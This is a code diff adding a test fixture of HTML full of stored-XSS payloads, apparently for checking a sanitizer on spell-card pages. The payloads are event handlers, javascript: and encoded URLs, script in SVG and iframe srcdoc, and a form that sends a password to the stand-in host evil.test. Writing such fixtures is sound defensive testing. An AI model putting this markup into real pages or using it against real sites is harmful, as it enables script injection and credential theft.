@@ -48,3 +48,17 @@ export function spellDetailFixture(externalId: string, includeCard = true): stri
     <section class="comments">Outside comment</section>
   </body></html>`;
 }
+
+export function storedXssDetailFixture(externalId: string): string {
+  return `<!doctype html><article class="card" data-id="spells:${externalId}" onclick="steal()">
+    <h2 class="card-title"><span data-copy="Safe spell">Safe spell</span></h2>
+    <p style="background:url(javascript:steal())" onmouseover="steal()">Retained rules</p>
+    <a href="javascript:steal()" title="unsafe protocol">bad link</a>
+    <a href="&#x6a;avascript:steal()">encoded bad link</a>
+    <a href="https://example.com/rule" target="_blank" rel="opener">safe link</a>
+    <img src="x" onerror="steal()"><iframe srcdoc="&lt;script&gt;steal()&lt;/script&gt;"></iframe>
+    <svg><script>steal()</script><a href="javascript:steal()">svg</a></svg>
+    <object data="javascript:steal()"></object><embed src="data:text/html,x"><link rel="stylesheet" href="//evil.test/x.css">
+    <form action="https://evil.test"><input name="password"></form>
+  </article>`;
+}
